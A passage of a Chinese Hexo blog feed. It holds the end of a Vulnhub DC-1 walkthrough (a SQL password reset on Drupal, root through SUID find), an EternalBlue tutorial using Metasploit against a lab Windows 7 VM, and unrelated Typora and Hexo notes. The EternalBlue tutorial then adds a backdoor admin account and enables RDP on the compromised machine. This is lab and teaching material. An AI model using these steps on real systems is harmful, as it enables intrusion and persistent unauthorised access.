src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC1%E9%9D%B6%E5%9C%BA/image-20230524173316627.png" alt="image-20230524173316627"></p><p>9 发现用户表，我们查询一下表里的字段信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users\G;</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC1%E9%9D%B6%E5%9C%BA/image-20230524173838106.png" alt="image-20230524173838106"></p><p>10 发现 <code>admin</code> 用户，密码为加密密码。得到密码密文后可以尝试进行解密或修改密码，搜索资料后发现这种加密是不可逆，并且 Drupal 提供了可以直接修改管理员密码的方法。<code>/var/www/scripts/</code> 目录下找到用户密码加密shell脚本，可以通过该脚本运行出一个自定义密码的哈希值。</p><p>在 <code>/var/www/</code> 下使用如下代码即可生成 tkm 这个字符串对应的 hash 值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php scripts/password-hash.sh tkm</span><br></pre></td></tr></table></figure><blockquote><p>$S$D7EC4G.3KriK0264C2qycKwh130ZTtpugIEHR0ABnbhF1BV7HXcE</p></blockquote><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC1%E9%9D%B6%E5%9C%BA/image-20230524175532451.png" alt="image-20230524175532451"></p><p>11 拿到与用户密码加密方式一样的哈希值后，再次进入数据库中，修改admin用户密码。命令如下：</p><p>update drupaldb.users set pass&#x3D;”$S$D7EC4G.3KriK0264C2qycKwh130ZTtpugIEHR0ABnbhF1BV7HXcE” where name&#x3D;’admin’</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update drupaldb.users set pass=&quot;&lt;hash 值&gt;&quot; where name=&#x27;admin&#x27;</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC1%E9%9D%B6%E5%9C%BA/image-20230524180220103.png" alt="image-20230524180220103"></p><p>12 修改后，账户密码我们都知道了，就可以登录</p><p>账号：admin</p><p>密码：tmk</p><p>13 登录后，什么都看不懂，建议都点击一遍，在 <code>Dashboard</code> 发现flag3</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC1%E9%9D%B6%E5%9C%BA/image-20230524181203291.png" alt="image-20230524181203291"></p><p>flag3中的内容，翻译为：</p><blockquote><p> 特殊的PERMS将有助于查找密码，但您需要执行该命令才能找到阴影中的内容。 </p></blockquote><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC1%E9%9D%B6%E5%9C%BA/image-20230524181256475.png" alt="image-20230524181256475"></p><p>14 查看后发现文本内容中有两个特别的大写字母 <code>perms</code> 和 <code>find</code> ，根据此前 flag 的形式，使用 <code>find / -name &quot;flag*&quot;</code> 搜索所有开头为 flag 的文件。</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC1%E9%9D%B6%E5%9C%BA/image-20230524181727161.png" alt="image-20230524181727161"></p><p>flag4.txt文件内容，翻译为</p><blockquote><p>你能用同样的方法在根目录中查找或访问标志吗？</p><p>可能但也许这并没有那么容易。或者可能是这样？</p></blockquote><p>15 根据 flag4.txt 中的内容，推测下一步需要进行提权，从而获得 root 权限，并访问 &#x2F;root 目录，获得 flag5。</p><p>16 根据 flag3 中另外一个大写字母 <code>perms</code> ，猜测可能需要使用 SUID 提权，使用如下命令查找所有具有 SUID 权限且属主为 root 的文件。</p><blockquote><p>SUID 权限：在执行过程中，调用者会暂时获得该文件的所有者权限，且该权限只在程序执行的过程中有效。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC1%E9%9D%B6%E5%9C%BA/image-20230524182118929.png" alt="image-20230524182118929"></p><p>17 发现了 find 命令，并且根据 flag3 中提到的 -exec，可以确定需要使用 find 提权</p><p>18 使用 <code>touch tkm</code> 创建提权需要的文件</p><p>然后使用如下命令进行提权。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find tkm -exec &#x27;/bin/sh&#x27; \;</span><br></pre></td></tr></table></figure><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC1%E9%9D%B6%E5%9C%BA/image-20230524182506957.png" alt="image-20230524182506957"></p><p>19 成功获得 root 权限，根据提示使用 <code>cd /root</code> 访问 &#x2F;root 目录，找到了 <code>thefinalflag.txt</code> ，使用 <code>cat thefinalflag.txt</code> 进行查看。</p><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC1%E9%9D%B6%E5%9C%BA/image-20230524182619333.png" alt="image-20230524182619333"></p><h3 id="知识点汇总"><a href="#知识点汇总" class="headerlink" title="知识点汇总"></a>知识点汇总</h3><blockquote><ol><li>使用 <code>nmap</code> 找寻并扫描靶机。</li><li>使用 <code>MSF</code> 的对应模块，进行漏洞利用。</li><li>利用 <code>Python</code> 实现交互式 Shell。</li><li>在数据库层面，修改 Drupal 站点的用户密码。</li><li>SUID 提权</li><li>find 提权</li></ol></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;Vulnhub是一个提供各种漏洞环境的靶场平台，提供给网络安全爱好者学习渗透使用，其中大部分环境是做好的虚拟机镜像文件，需要使用VMware和VirtualBox运行。镜像文件中预先设计了多种漏洞，需要通过预设的漏洞获得虚拟机的权限，并想办法提权到root，获得&amp;#x2F;root目录下的&amp;#x2F;flag文件（部分靶机具有多个flag）&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>永恒之蓝 CVE-2017-0143</title>
    <link href="http://example.com/2023/05/11/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/"/>
    <id>http://example.com/2023/05/11/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/</id>
    <published>2023-05-11T05:25:37.000Z</published>
    <updated>2023-05-25T03:01:59.447Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、什么是永恒之蓝"><a href="#一、什么是永恒之蓝" class="headerlink" title="一、什么是永恒之蓝"></a>一、什么是永恒之蓝</h3><p>永恒之蓝（Eternal Blue）爆发于2017年4月14日晚，是一种利用Windows系统的SMB协议漏洞来获取系统的最高权限，以此来控制被入侵的计算机。甚至于2017年5月12日， 不法分子通过改造“永恒之蓝”制作了wannacry勒索病毒，使全世界大范围内遭受了该勒索病毒，甚至波及到学校、大型企业、政府等机构，只能通过支付高额的赎金才能恢复出文件。不过在该病毒出来不久就被微软通过打补丁修复。</p><span id="more"></span><h3 id="二、什么是SMB协议"><a href="#二、什么是SMB协议" class="headerlink" title="二、什么是SMB协议"></a>二、什么是SMB协议</h3><p>SMB（Server Message Block）通信协议是微软（Microsoft）和英特尔(Intel)在1987年制定的协议，主要是作为Microsoft网络的通讯协议。SMB 是在会话层（session layer）和表示层（presentation layer）以及小部分应用层（application layer）的协议。通过SMB协议可以在计算机间共享文件、打印机、命名管道等资源，电脑上的网上邻居就是靠SMB实现的；SMB协议工作在应用层和会话层，可以用在TCP&#x2F;IP协议之上，SMB使用TCP139端口和TCP445端口。</p><h3 id="三、漏洞描述"><a href="#三、漏洞描述" class="headerlink" title="三、漏洞描述"></a>三、漏洞描述</h3><p>永恒之蓝 主要就是通过TCP端口（445）和139 来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的windows 机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器里进行一系列的危险操作。如远程控制木马，获取最高权限等。</p><h3 id="四、影响范围"><a href="#四、影响范围" class="headerlink" title="四、影响范围"></a>四、影响范围</h3><p>windows xp 2003 2008 7 8 等受影响</p><h3 id="五、准备工具"><a href="#五、准备工具" class="headerlink" title="五、准备工具"></a>五、准备工具</h3><p>vm虚拟机软件</p><p>网络模式：NAT</p><p>攻击机：kali系统2023.1（192.168.170.128）</p><p>靶机：windows7系统专业版（开启了445端口，并且防火墙关闭）（192.168.170.142）</p><h3 id="六、漏洞利用"><a href="#六、漏洞利用" class="headerlink" title="六、漏洞利用"></a>六、漏洞利用</h3><h4 id="1-nmap扫描靶机"><a href="#1-nmap扫描靶机" class="headerlink" title="1 nmap扫描靶机"></a>1 nmap扫描靶机</h4><p>登录kali，win7系统，利用kali使用nmap扫描探测本网段存活的主机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.170.1/24</span><br></pre></td></tr></table></figure><p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230519083902044.png" alt="image-20230519083902044"></p><p>发现我们的靶机开启了很多端口，我们需要找到的就是 <code>445</code> 端口。</p><p>445端口是一种TCP端口，该端口在windows 2000 Server或Windows Server 2003系统中发挥的作用与139端口是完全相同的。 具体地说，它可以提供局域网中文件或打印机共享服务。</p><h4 id="2-使用Metasploit监听目标"><a href="#2-使用Metasploit监听目标" class="headerlink" title="2 使用Metasploit监听目标"></a>2 使用Metasploit监听目标</h4><p>输入如下命令启动Metasploit</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230518152450860.png" alt="image-20230518152450860"></p><h4 id="3-攻击流程"><a href="#3-攻击流程" class="headerlink" title="3 攻击流程"></a>3 攻击流程</h4><p>进入后查找找永恒之蓝漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms17-010</span><br></pre></td></tr></table></figure><p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230518162234825.png" alt="image-20230518162234825"></p><blockquote><p>0   exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue：用于利用EternalBlue漏洞实现SMB远程代码执行。</p><p>1   exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_psexec：用于利用EternalRomance、EternalSynergy或EternalChampion漏洞实现SMB远程代码执行。</p><p>2   auxiliary&#x2F;admin&#x2F;smb&#x2F;ms17_010_command：用于利用EternalRomance、EternalSynergy或EternalChampion漏洞实现SMB远程命令执行。</p><p>3   auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010：用于检测目标是否存在MS17-010漏洞。</p><p>4   exploit&#x2F;windows&#x2F;smb&#x2F;smb_doublepulsar_rce：用于利用DoublePulsar漏洞实现SMB远程代码执行。</p></blockquote><p>选择检测模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use 3</span><br></pre></td></tr></table></figure><p>查看模块信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info</span><br></pre></td></tr></table></figure><p>查看需要修改的选项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure><p>设置攻击目标</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set rhosts 192.168.170.142</span><br></pre></td></tr></table></figure><p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230519084326942.png" alt="image-20230519084326942"></p><p>执行模块攻击检测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230519084303566.png" alt="image-20230519084303566">前面为 <code>+</code> 号，表示可以攻击。</p><p>接下来的步骤就开始攻击</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">back   #退出模块</span><br><span class="line">search ms17-010#查找漏洞</span><br><span class="line">use 0   #选择攻击模块</span><br><span class="line">set rhosts 192.168.170.142 #设置攻击目标</span><br><span class="line">run   #攻击</span><br></pre></td></tr></table></figure><p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230519090115579.png" alt="image-20230519090115579"></p><blockquote><p>成功 上图就是成功打进了</p><p>报错:漏洞利用因失败而中止（可能原因是win7版本的问题）</p></blockquote><h4 id="4-得到靶机shell"><a href="#4-得到靶机shell" class="headerlink" title="4 得到靶机shell"></a>4 得到靶机shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure><p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230519090824111.png" alt="image-20230519090824111"></p><p>接下来就是搞事情了</p><p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230519091036102.png" alt="image-20230519091036102"></p><p>由于有乱码，我们需要输入如下代码即可恢复</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chcp 65001</span><br></pre></td></tr></table></figure><h4 id="5-通过shell对靶机进行控制"><a href="#5-通过shell对靶机进行控制" class="headerlink" title="5 通过shell对靶机进行控制"></a>5 通过shell对靶机进行控制</h4><h5 id="1-创建新用户"><a href="#1-创建新用户" class="headerlink" title="(1) 创建新用户"></a>(1) 创建新用户</h5><p>语法：net user 用户名 密码 &#x2F;add</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user yhzl 123456 /add</span><br></pre></td></tr></table></figure><p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230519092038840.png" alt="image-20230519092038840"></p><p>查看用户信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230519092348625.png" alt="image-20230519092348625"></p><h5 id="2-将用户添加至管理员组"><a href="#2-将用户添加至管理员组" class="headerlink" title="(2)将用户添加至管理员组"></a>(2)将用户添加至管理员组</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators yhzl /add</span><br></pre></td></tr></table></figure><p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230519093534270.png" alt="image-20230519093534270"></p><h5 id="3-开启远程桌面功能"><a href="#3-开启远程桌面功能" class="headerlink" title="(3) 开启远程桌面功能"></a>(3) 开启远程桌面功能</h5><p>查看3389端口状态</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure><p>看到3389端口并没有开启，开启3389端口</p><p>方法一</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure><p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230519094005308.png" alt="image-20230519094005308"></p><p>方法二</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic RDTOGGLE WHERE ServerName=&#x27;%COMPUTERNAME%&#x27; call SetAllowTSConnections 1</span><br></pre></td></tr></table></figure><h5 id="4-远程桌面连接靶机"><a href="#4-远程桌面连接靶机" class="headerlink" title="(4) 远程桌面连接靶机"></a>(4) 远程桌面连接靶机</h5><p>添加好之后，就可以用工具去连了，这里我目前知道的 kali 自带工具有 xfreerdp，这是公司的大佬介绍给我用的，还有一个是我自己找的，叫做：rdesktop。</p><p>现在分别讲讲各自的用法吧：</p><p><strong>xfreerdp 工具</strong><br>首先是 xfreerdp 的，命令格式如下：</p><p>很容易理解，&#x2F;u 就是用户名，&#x2F;p 是密码，&#x2F;v 是靶机（目标）的地址 &#x2F;size 就是图形化界面的大小而已。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /u:hack /p:123123 /v:192.168.170.142 /size:80%</span><br></pre></td></tr></table></figure><p><strong>5.2、xfreerdp 工具</strong></p><p>然后是 rdesktop，命令格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 192.168.170.142:3389</span><br></pre></td></tr></table></figure><p><img src="/./../images/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010/image-20230519095116540.png" alt="image-20230519095116540"></p><p>连进来，为所欲为了，纯鼠标无脑操作，比命令行操作方便简单，到此结束。</p><p>上面这是一个简单的演示，告诉大家这个漏洞很危险，真正的攻击能做的事情更多。</p><p>注意：我们要做一个遵纪守法的白帽子。</p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;一、什么是永恒之蓝&quot;&gt;&lt;a href=&quot;#一、什么是永恒之蓝&quot; class=&quot;headerlink&quot; title=&quot;一、什么是永恒之蓝&quot;&gt;&lt;/a&gt;一、什么是永恒之蓝&lt;/h3&gt;&lt;p&gt;永恒之蓝（Eternal Blue）爆发于2017年4月14日晚，是一种利用Windows系统的SMB协议漏洞来获取系统的最高权限，以此来控制被入侵的计算机。甚至于2017年5月12日， 不法分子通过改造“永恒之蓝”制作了wannacry勒索病毒，使全世界大范围内遭受了该勒索病毒，甚至波及到学校、大型企业、政府等机构，只能通过支付高额的赎金才能恢复出文件。不过在该病毒出来不久就被微软通过打补丁修复。&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Typora快捷键</title>
    <link href="http://example.com/2023/03/29/Typora%E5%BF%AB%E6%8D%B7%E9%94%AE/"/>
    <id>http://example.com/2023/03/29/Typora%E5%BF%AB%E6%8D%B7%E9%94%AE/</id>
    <published>2023-03-28T18:34:21.000Z</published>
    <updated>2023-05-25T03:00:55.853Z</updated>
    
    <content type="html"><![CDATA[<p>Typora是很好用的Markdown语法编辑器，很方便用来记笔记。如果你也在使用，可以学习下相应的快捷键，来增加自己的记笔记的速度，下面列出来常用的快捷键。如果需要定义自己的快捷键，点击上面的官方链接查看如何自定义快捷键。</p><span id="more"></span><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">Ctrl + 1 ：一级标题</span><br><span class="line">Ctrl + 2 ：二级标题</span><br><span class="line">Ctrl + 3 ：三级标题</span><br><span class="line">Ctrl + 4 ：四级标题</span><br><span class="line">Ctrl + 5 ：五级标题</span><br><span class="line">Ctrl + 6 ：六级标题</span><br><span class="line">Ctrl + 0 ：段落</span><br><span class="line"></span><br><span class="line">Ctrl + = ：提升标题等级</span><br><span class="line">Ctrl + - ：降低标题等级</span><br><span class="line">Ctrl + Home ：跳转到文首</span><br><span class="line">Ctrl + End ：跳转到文末</span><br><span class="line">Ctrl + Tab ：应用内窗口切换</span><br><span class="line">Ctrl + / ：源代码模式</span><br><span class="line">Ctrl + \ ：清除样式</span><br><span class="line">Ctrl + [ ：减少缩进</span><br><span class="line">Ctrl + ] ：增加缩进</span><br><span class="line">Ctrl + 逗号 ：偏好设置</span><br><span class="line"></span><br><span class="line">Ctrl + A ：全选</span><br><span class="line">Ctrl + B ：加粗</span><br><span class="line">Ctrl + C ： 复制</span><br><span class="line">Ctrl + D ：选中当前词</span><br><span class="line">Ctrl + E ：选中当前格式文本</span><br><span class="line">Ctrl + F ：查找</span><br><span class="line">  F3 ：查找下一个</span><br><span class="line">shift + F3 ：查找上一个</span><br><span class="line">Ctrl + H ：替换</span><br><span class="line">Ctrl + I ：斜体</span><br><span class="line">Ctrl + J ：跳转到所选内容</span><br><span class="line">Ctrl + K ：超链接</span><br><span class="line">Ctrl + L ：选中当前行</span><br><span class="line">Ctrl + N ：新建文件</span><br><span class="line">Ctrl + O ：打开</span><br><span class="line">Ctrl + P ：快速打开（快速打开之前编辑过的历史文件）</span><br><span class="line">Ctrl + S ：保存</span><br><span class="line">Ctrl + T ：插入表格</span><br><span class="line">Ctrl + U ：下划线</span><br><span class="line">Ctrl + V ：粘贴</span><br><span class="line">Ctrl + W ：关闭</span><br><span class="line">Ctrl + X ：剪切</span><br><span class="line">Ctrl + Y ：重做</span><br><span class="line">Ctrl + Z ：撤销</span><br><span class="line"></span><br><span class="line">Ctrl + shift + 1 ：大纲</span><br><span class="line">Ctrl + shift + 2 ：文档列表</span><br><span class="line">Ctrl + shift + 3 ：文件树</span><br><span class="line">Ctrl + shift + 9 ：实际大小</span><br><span class="line"></span><br><span class="line">Ctrl + shift + C ：复制为MarkDown格式</span><br><span class="line">Ctrl + shift + D ：删除当前词</span><br><span class="line">Ctrl + shift + E ：使用上一次设置导出</span><br><span class="line">Ctrl + shift + F ：搜索</span><br><span class="line">Ctrl + shift + I ：插入图片</span><br><span class="line">Ctrl + shift + K ：插入代码块</span><br><span class="line">Ctrl + shift + L ：显示/隐藏侧边栏</span><br><span class="line">Ctrl + shift + M ：插入公式</span><br><span class="line">Ctrl + shift + N ：新建窗口</span><br><span class="line">Ctrl + shift + Q ：引用</span><br><span class="line">Ctrl + shift + S ：另存为</span><br><span class="line">Ctrl + shift + T ：重新打开关闭的文件</span><br><span class="line">Ctrl + shift + V ：粘贴为纯文本格式</span><br><span class="line">Ctrl + shift + X ：任务列表</span><br><span class="line"></span><br><span class="line">Ctrl + shift + [ ：有序列表</span><br><span class="line">Ctrl + shift + ] ：无序列表</span><br><span class="line">Ctrl + shift + = ：放大</span><br><span class="line">Ctrl + shift + - ：缩小</span><br><span class="line">Ctrl + shift + ` ：代码</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Alt + shift + P ：打印</span><br><span class="line">Alt + shift + 5 ：删除线</span><br><span class="line"></span><br><span class="line">Alt + Ctrl + P ：选择段落或块</span><br><span class="line"></span><br><span class="line">Alt + Ctrl + shift + P ：删除块</span><br><span class="line">Alt + Ctrl + shift + L ：删除当前行或句</span><br><span class="line">Alt + Ctrl + shift + E ：删除当前格式文本</span><br><span class="line"></span><br><span class="line">shift + F10 ：快捷操作弹窗</span><br><span class="line">shift + F12 ：开发者工具</span><br><span class="line"></span><br><span class="line">F3 ：查找</span><br><span class="line">F8 ：专注模式</span><br><span class="line">F9 ：打字机模式</span><br><span class="line">F11 ：全屏</span><br><span class="line"></span><br><span class="line">win + 句号 ：表情与符号</span><br><span class="line">Home ：跳转到行首</span><br><span class="line">End ：跳转到行尾</span><br></pre></td></tr></table></figure><p>————————————————<br>版权声明：本文为CSDN博主「一&amp;粟」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/D_huili/article/details/125301376">https://blog.csdn.net/D_huili/article/details/125301376</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Typora是很好用的Markdown语法编辑器，很方便用来记笔记。如果你也在使用，可以学习下相应的快捷键，来增加自己的记笔记的速度，下面列出来常用的快捷键。如果需要定义自己的快捷键，点击上面的官方链接查看如何自定义快捷键。&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>写博客、发布博客</title>
    <link href="http://example.com/2023/03/29/%E5%86%99%E5%8D%9A%E5%AE%A2%E3%80%81%E5%8F%91%E5%B8%83%E5%8D%9A%E5%AE%A2/"/>
    <id>http://example.com/2023/03/29/%E5%86%99%E5%8D%9A%E5%AE%A2%E3%80%81%E5%8F%91%E5%B8%83%E5%8D%9A%E5%AE%A2/</id>
    <published>2023-03-28T18:23:15.772Z</published>
    <updated>2023-05-25T02:55:20.275Z</updated>
    
    <content type="html"><![CDATA[<p>首先，在Blog文件夹右键打开Git Bash Here<br>新建一篇博客，执行下面的命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new post &quot;article title&quot;</span><br></pre></td></tr></table></figure><p>这时候在我的 电脑的目录下 F:\hexo\source_posts 将会看到 article title.md 文件</p><p>用MarDown编辑器打开就可以编辑文章了。文章编辑好之后，运行生成、部署命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo g // 生成</span><br><span class="line">hexo s //在本地部署</span><br><span class="line">hexo d // 部署</span><br></pre></td></tr></table></figure><span id="more"></span><p>当然你也可以执行下面的命令，相当于上面两条命令的效果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d -g #在部署前先生成</span><br></pre></td></tr></table></figure><p>然后访问域名就可以访问我们的博客了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;首先，在Blog文件夹右键打开Git Bash Here&lt;br&gt;新建一篇博客，执行下面的命令：&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;hexo new post &amp;quot;article title&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;这时候在我的 电脑的目录下 F:\hexo\source_posts 将会看到 article title.md 文件&lt;/p&gt;
&lt;p&gt;用MarDown编辑器打开就可以编辑文章了。文章编辑好之后，运行生成、部署命令：&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;hexo g // 生成&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;hexo s //在本地部署&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;hexo d // 部署&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    
  </entry>
  
</feed>
